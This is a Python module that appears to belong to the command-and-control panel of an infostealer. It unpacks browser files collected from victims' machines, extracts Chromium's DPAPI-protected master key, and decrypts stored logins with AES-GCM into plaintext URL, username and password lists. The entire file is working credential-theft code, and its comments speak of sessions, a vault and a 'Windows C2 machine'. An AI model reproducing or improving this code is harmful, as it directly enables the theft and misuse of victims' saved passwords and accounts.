# ui/decryption_util.py (Full Code - Corrected Import and Data Access)
import os
import json
import base64
import sqlite3
import zipfile
import tempfile
import io
import shutil
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

try:
    import win32crypt
    DPAPI_AVAILABLE = True
except ImportError:
    DPAPI_AVAILABLE = False

class Decryptor:
    def __init__(self, vault_data):
        self.vault_data = vault_data
        self.master_key = None
        # Use a temporary directory that is automatically cleaned up
        self.temp_dir = tempfile.TemporaryDirectory()

    def __del__(self):
        # The TemporaryDirectory object cleans itself up automatically
        self.temp_dir.cleanup()

    def _extract_files(self):
        # --- DEFINITIVE FIX FOR SMOOTH OPERATION ---
        # The vault data is nested. Access it at the correct path.
        browser_files_module = self.vault_data.get("Browser Files", {}).get("output", {})
        if not browser_files_module:
            return False, "Browser Files module data not found in the vault for this session."

        b64_zip_data = browser_files_module.get("data")
        if not isinstance(b64_zip_data, str):
            return False, "Browser file data is missing or not in the correct base64 string format."

        try:
            zip_bytes = base64.b64decode(b64_zip_data)
            with zipfile.ZipFile(io.BytesIO(zip_bytes), 'r') as zf:
                # Extract into the temp dir managed by TemporaryDirectory
                zf.extractall(self.temp_dir.name)
            return True, "Files extracted successfully."
        except Exception as e:
            return False, f"Failed to decode or extract browser files from zip: {e}"

    def _get_master_key(self, browser_name):
        if not DPAPI_AVAILABLE:
            return None, "PyWin32 is not installed. Decryption is only possible on a Windows C2 machine."
        
        local_state_path = os.path.join(self.temp_dir.name, f"{browser_name}_Local_State")
        if not os.path.exists(local_state_path):
            return None, f"Local State file for {browser_name} not found in extracted files."
            
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
            encrypted_key_dpapi = base64.b64decode(encrypted_key_b64)
            # The key is prefixed with 'DPAPI'
            master_key = win32crypt.CryptUnprotectData(encrypted_key_dpapi[5:], None, None, None, 0)[1]
            return master_key, None
        except Exception as e:
            return None, f"Failed to extract and decrypt master key for {browser_name}: {e}"

    def _decrypt_value(self, encrypted_value, master_key):
        if not master_key: return "NO_MASTER_KEY"
        if not encrypted_value: return ""
        try:
            # Handle modern Chrome (v80+) AES GCM encryption
            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                iv = encrypted_value[3:15]
                payload = encrypted_value[15:]
                # AES GCM requires an AEAD cipher instance
                return AESGCM(master_key).decrypt(iv, payload, None).decode('utf-8')
            # Handle older Chrome DPAPI encryption
            else:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
        except Exception:
            return "DECRYPTION_FAILED"

    def decrypt_passwords(self):
        success, message = self._extract_files()
        if not success: return {"error": message}

        all_passwords = []
        # Find all login databases in the extracted files
        browsers_found = list(set([f.split('_')[0] for f in os.listdir(self.temp_dir.name) if '_Login_Data' in f]))

        for browser in browsers_found:
            master_key, error = self._get_master_key(browser)
            if error:
                # Log the error but continue, as other browsers might work
                print(f"[DECRYPTION] Warning for {browser}: {error}")

            login_db_path = os.path.join(self.temp_dir.name, f"{browser}_Login_Data")
            if not os.path.exists(login_db_path): continue
            
            # Create a temporary copy to avoid database lock issues
            temp_db_path = os.path.join(self.temp_dir.name, f"temp_{browser}_db")
            shutil.copy2(login_db_path, temp_db_path)

            try:
                conn = sqlite3.connect(temp_db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    url, username, encrypted_pass = row
                    if not all([url, username, encrypted_pass]): continue
                    
                    password = self._decrypt_value(encrypted_pass, master_key)
                    if password and password not in ["NO_MASTER_KEY", "DECRYPTION_FAILED"]:
                        all_passwords.append([browser, url, username, password])
                conn.close()
            except Exception as e:
                 print(f"[DECRYPTION] Failed to read password database for {browser}: {e}")
        
        return all_passwords